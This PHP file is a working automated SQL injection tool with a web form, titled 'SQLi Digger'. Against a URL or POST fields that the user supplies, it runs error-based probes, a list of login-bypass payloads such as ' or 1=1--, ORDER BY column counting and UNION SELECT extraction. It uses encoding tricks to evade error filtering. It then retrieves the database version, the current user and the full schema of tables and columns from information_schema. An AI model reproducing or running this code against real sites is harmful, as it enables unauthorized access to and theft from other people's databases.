<?
error_reporting(E_ALL ^ E_NOTICE);
//***** FIRST PARAMS
$vulnerable=false;
$post=false;
$login_url=false;
$default_error=false;
$num_columns_limit=40;
$num_columns_start=15;
$replace_key="%Inject_Here%";
$default_delimiter='1135';
$query_hack_multiplier=11111;
$default_fud=1; // Put 0,1,2,3 check $fud_rows array to see them
$_INJECTION=array(); //sqli information will be saved here
echo'<pre>'; //testing
//***********

$last_fail=0;

//************ FUNCTIONS ********* //
function curl($url, $data = '', $isLogin = 0) 
{
    $ch = curl_init($url);
    $header = array();
    $header[0]  = "Accept: text/xml,application/xml,application/xhtml+xml,";
    $header[0] .= "text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5";
    $header[]   = "Cache-Control: max-age=0";
    $header[]   = "Connection: keep-alive";
    $header[]   = "Keep-Alive: 300";
    $header[]   = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    $header[]   = "Accept-Language: en-us,en;q=0.5";
    $header[]   = "Pragma: "; // 1135browsers keep this blank.

    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1.7) Gecko/20070914 Firefox/2.0.0.7');
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    if($isLogin)
        curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
    else
        curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_AUTOREFERER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    return curl_exec($ch);
}
function replace($method,$comilla='',$debug=false)
{
    global $post,$post_vars,$url,$replace_key;
    if($comilla==''){$comilla=$replace_key;}
    //Replace %Inject_Here%(replace_key) with the requested query and execute it

    if($post){
        $post_vars=str_replace($comilla,$method,$post_vars);
        if($debug){
            $content=$post_vars;
        }else{
            $content=curl($url,$post_vars);
        }

    }else{
        $site=str_replace($comilla,$method,$url);
        if($debug){
            $content=$site;
        }else{
            $content=curl($site);
        }

    }
    return $content;
}
function get_info($affected_row=false,$command=false,$type=false,$coletilla=false){
    global $union_query,$default_delimiter,$default_fud,$fud_rows,$union_select,$_INJECTION;
    if(!$affected_row || !$command){para('get_info() missing information');}

    if($coletilla){
        $union_query=str_replace($union_select[$_INJECTION['method']]['coletilla'],$coletilla,$union_query);
    }

    if($affected_row==1){
        $aio_request=str_replace('%20'.$affected_row,'%20concat_ws(0x7e,'.$default_delimiter.",".$command.",".$default_delimiter.')',$union_query);
    }else{
        $aio_request=str_replace(','.$affected_row.',',",concat_ws(0x7e,".$default_delimiter.",".$command.",".$default_delimiter."),",$union_query);
    }
    $content=filter(replace($aio_request),$default_delimiter.",".$command.",".$default_delimiter);
    //print_r($content);
    if(strpos($content,"$default_delimiter")!==false){
        $pre_content=explode($default_delimiter,$content);

        //AIO Request
        if($type==1){
            $pre_content[1]=explode('~',$pre_content[1]);

        }else{
            $pre_content=explode('~',$pre_content[1]);
        }

        $content=$pre_content[1];
    }else{

        //We fud it
        $affected_row=str_replace('-ROW-',$affected_row,$fud_rows[$default_fud]);
        $aio_request=str_replace(','.$affected_row.',',",".$default_delimiter.$command.$default_delimiter.",",$union_query);
        $content=replace($aio_request);
        if(strpos($content,$default_delimiter)!==false){
            $pre_content=explode($default_delimiter,$content);
            $content=$pre_content[1];
        }else{
            $content=false;
        }

    }


    return $content;
}
function filter($content,$query,$to=false){
    if($to){
        $content=str_replace($query,$to,$content);
    }else{
        $content=str_replace($query,'',$content);
    }
    return $content;
}
function para($message)
{
    global $_INJECTION;
	
	$_INJECTION['message']=$message;
	die(json_encode($_INJECTION));	
}
//************ FUNCTIONS ********* //



if(!isset($_REQUEST['url']) || $_REQUEST['url']==''){
?>
<html>
<head>
	<title>SQLi Digger</title>
	<style>
	</style>
</head>
<body>
	<center>
		<h1>SQLi Digger</h1>
		<input style="width:500px;" name="url" id="url" placeholder="http://site.com/?id=2\'" type="text"><button onclick="check();">Check</button>
		<br><label>POST (optional):<input style="width:400px;" name="post" type="text"></label><br>
		<label>login bypass?<select name="islogin" id="islogin"><option value="">no</option><option value="1">yes</option></select></label>
	</center>
	<div id="result">
		
	</div>
	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
	<script type="text/javascript">
		function check()
		{
			var url=$('#url').val();
			if(url==''){return false;}
			$('#result').html('Checking site... May take a long time..');
			
			$.post('',{url:url},function (data){
				
				$('#result').html(data);
				data=jQuery.parseJSON(data);								
			})
			.fail(function() { $('#result').html('Something went wrong'); });
		}
	</script>	
</body>
</html>	
<?
	die();
}elseif($_REQUEST['post']!=''){
    $post=true;
    $post_vars=urldecode($_REQUEST['post']);
}
if($_REQUEST['islogin']==1){
    $login_url=true;
}

$url=urldecode($_REQUEST['url']);
$checking_done=false;

if(strpos($url,'http://')===false){
    para('invalid url');
}elseif(strpos($url,"'")===false && strpos($url,$replace_key)===false){
    if($post)
    {
        if(strpos($post_vars,"'")===false  && strpos($post_vars,$replace_key)===false)
        {
            para('"\'" not found, ive recieved: '.$url);
        }
        else
        {
            if(strpos($post_vars,$replace_key)===false){
                $checking_done=true;
                $post_vars=str_replace("'",$replace_key,$post_vars);
            }
        }
    }else{
        para('"\'" not found, ive recieved: '.$url);
    }
}
if(!$checking_done){
    if(strpos($url,$replace_key)===false){
        $url=str_replace("\'",$replace_key,$url);//delete this
        $url=str_replace("'",$replace_key,$url);
    }
}



///******* IMPORTANT ARRAYS *************///

//normal sqli
$methods=array(
    "%27",
    "999999.9",
    "+and+1%3D1",
    "+and+1%3E1"
);

//login bypass
$admin_methods=array(
    "' or '1'='1","
'or'1=1'","
' or 'x'='x","
' or 0=0 --",'
" or 0=0 --',"
or 0=0 --","
' or 0=0 #","
\" or 0=0 #","
or 0=0 # ","
' or 'x'='x","
\" or \"x\"=\"x","
') or ('x'='x","
' or 1=1--","
\" or 1=1--","
or 1=1--","
' or a=a--","
\" or \"a\"=\"a","
') or ('a'='a","
\") or (\"a\"=\"a","
hi\" or \"a\"=\"a","
hi\" or 1=1 --","
hi' or 1=1 --");

//sqli success detection
$errors=array(
    "Microsoft OLE DB Provider for ODBC Drivers",
    "mysql_","You have an error in your SQL syntax",
    "mysql_num_rows()",
    "Warning: Fatal error",
    "Incorrect syntax",
    "mysql_fetch_array()");

//columns obtain methods
$columns_method=array(0=>'%20order%20by%20-NUM---',1=>"%20order%20by%20-NUM---+");

//common errors for num colm success detection
$columns_error=array(0=>'Unknown column');

//bypass error messages
$fud_rows=array(
    0=>"convert(-ROW- using latin1)",
    1=>"unhex(hex(-ROW-))",
    2=>"aes_decrypt(aes_encrypt(-ROW-,1),1)",
    3=>"UNCOMPRESS(COMPRESS(-ROW-))");

//great info to obtain
$general_info=array(
    "version"=>array(0=>"@@version",1=>"version()"),
    "datadir"=>array(0=>"@@datadir",1=>"datadir()"),
    "database"=>array(0=>"@@database",1=>"database()"),
    "current_user"=>array(0=>"@@current_user",1=>"current_user()"));

//union select queries
$union_select=array(
    0=>array('union'=>"%20union%20all%20select%20",'coletilla'=>"--"),
    1=>array('union'=>"%27%20union%20select%20all%20",'coletilla'=>"--+")
);

///******* IMPORTANT ARRAYS *************///

//Shortcut for sqli logins
if($login_url){
    $methods=$admin_methods;
}

//Lets check if its vulnerable
foreach($methods as $method)
{
    $content=replace($method);
    foreach($errors as $error){
        if(strpos($content,$error)!==false){
            $vulnerable=true;
            $default_method=$method;
            $default_error=$error;
            $_INJECTION["error"]=$error;
            break;
        }
    }
	if($vulnerable){
		 break;
	}
}



if(!$vulnerable){
    /* Example
             limit columns= 30
             while(1!=30)
                 99999+union+all+select+1
                 99999+union+all+select+1,2
                 99999+union+all+select+1,2,3
                 99999+union+all+select+1,2,3,4,5,6,7,8,9....30
                 every time we make strpos to try to find any column on the site

             */
    //trying direct union select
    $num_method=0;
    $union_query="99999%20union%20all%20select%20";
    $union_query_hack=$union_query;
    $i=1;

    while($i!=$num_columns_limit)
    {

        if($i==1){
            $union_query.=$i;
            $union_query_hack.=$i*11111;
            $query_hack.=$i*11111;//for false positives
        }else{
            $union_query.=','.$i;
            $union_query_hack.=','.$i*11111;
            $query_hack.=','.$i*11111;//for false positives
        }

        //now check if wee see any row
        $content=replace($union_query_hack.$union_select[$num_method]['coletilla']);

        $o=1;
        while($o<=$i){
            $esto=$o*11111;

            // delete false positives
            /*
                       if($o==1 ||$o==0 ){
                           $content=str_replace($esto.$union_select[$num_method]['coletilla'],'',$content);
                       }else{
                           $content=str_replace('11111'.$union_select[$num_method]['coletilla'],'',$content);
                           $content=str_replace(','.$esto.',','',$content);
                       }
                       */
            $content=str_replace($query_hack,'',$content);

            if(strpos($content,"$esto")!==false){
                $affected_row=$o;
                break;
            }
            $o++;
        }

        if($affected_row!=''){
            $vulnerable=true;
            $union_query.=$union_select[$num_method]['coletilla'];
            $_INJECTION["method"]=$num_method;
            $_INJECTION["affected_row"]=$affected_row;
            break;
        }

        $i++;
    }
    if(!$vulnerable){
        para('No injection found, safe :)');
    }
}


// Now i continue or i stop?
if($vulnerable){

    if($login_url){
        para('It is! :( Usage:'.$default_method);
    }else{
        //jump if its mysql error based
        if(!isset($affected_row) || $affected_row==''){
            foreach($columns_method as $num_method=>$column_method){

                //Check default column error message and decide method
                $content=replace(str_replace("-NUM-",9999,$column_method));
                foreach($columns_error as $column_error){
                    if(strpos($content,$column_error)!==false){
                        $default_column_error=$column_error;
                        break;
                    }

                }
				

                //order by method should work
                if(isset($default_column_error) && $default_column_error!=''){

                    $i=$num_columns_start;
                    $found=false;

                    while($i!=$num_columns_limit && $i>0)
                    {
                        $content=replace(str_replace("-NUM-",$i,$column_method));
                        if(strpos($content,$default_column_error)!==false){
                            $last_fail=$i;
                            $i--;
                        }else{
                            $last_win=$i;
                            $i++;
                        }

                        $near=$last_win+1;
                        if($last_win!=0 && $last_fail!=0){
                            if($near==$last_fail){
                                $num_columns=$last_win;
								$_INJECTION['num_columns']=$num_columns;
                                $found=true;
                                //para('num columns:'.$num_columns);
                                break;
                            }
                        }

                    }
                    if($found){break;}

                }

            }

            // Lets build union all query
            if(isset($found) && $found){

                $i=1;
                $union_query=$union_select[$num_method]['union'];
                $union_query_hack=$union_select[$num_method]['union'];

                while($i<=$num_columns){
                    if($i==1){
                        $union_query.=$i;
                        $union_query_hack.=$i*11111;
                        $query_hack.=$i*11111;//for false positives
                    }else{
                        $union_query.=','.$i;
                        $union_query_hack.=','.$i*11111;
                        $query_hack.=','.$i*11111;//for false positives
                    }
                    $i++;
                }
                $union_query.=$union_select[$num_method]['coletilla'];
                $union_query_hack.=$union_select[$num_method]['coletilla'];

                //now check if wee see any row
                $content=replace($union_query_hack);
                $i=1;
                while($i<=$num_columns){
                    $esto=$i*11111;

                    $content=str_replace($query_hack,'',$content);

                    if(strpos($content,"$esto")!==false){
                        $affected_row=$i;
                        $_INJECTION["method"]=$num_method;
                        $_INJECTION["affected_row"]=$affected_row;
                        break;
                    }
                    $i++;
                }
                if($affected_row==''){
                    para('Couldnt find any column to show info');
                }

            }
        }
        // Next step, trigger info
        if(isset($affected_row) && $affected_row!=''){

            //all in one petition for mysql<4.x
            $get_info=get_info($affected_row,"version(),user(),database()",1); // 1 means AIO
            if($get_info){
                $host_info=$get_info;
                $host_info[0]=replace($union_query,$replace_key,true);
                unset($host_info[4]);
            }else{
                $i=1;
                foreach($general_info as $info=>$option){
                    $get_info=get_info($affected_row,$option[0]);
                    if($get_info){
                        $host_info[$i]=$get_info;
                    }elseif(!$get_info && isset($option[1])){
                        $get_info=get_info($affected_row,$option[1]);
                        if($get_info){
                            $host_info[$i]=$get_info;
                        }else{
                            para('system failed obtaining '.$info.'. Affected row: '.$affected_row);
                        }
                    }else{
                        para('system failed obtaining '.$info.'. Affected row: '.$affected_row);
                    }
                    $i++;
                }

            }

            //print_r($host_info);

            //get db,table and column names
            $get_info=get_info($affected_row,"table_schema,table_name,column_name",1,"+from+information_schema.columns+WHERE+table_schema!=0x6d7973716c+AND+table_schema+!=0x696e666f726d6174696f6e5f736368656d61--"); // 1 means AIO
            if($get_info){
                print_r($get_info);
            }
            para('end');
        }
    }

}else{
    para(' safe :)');
}

?>
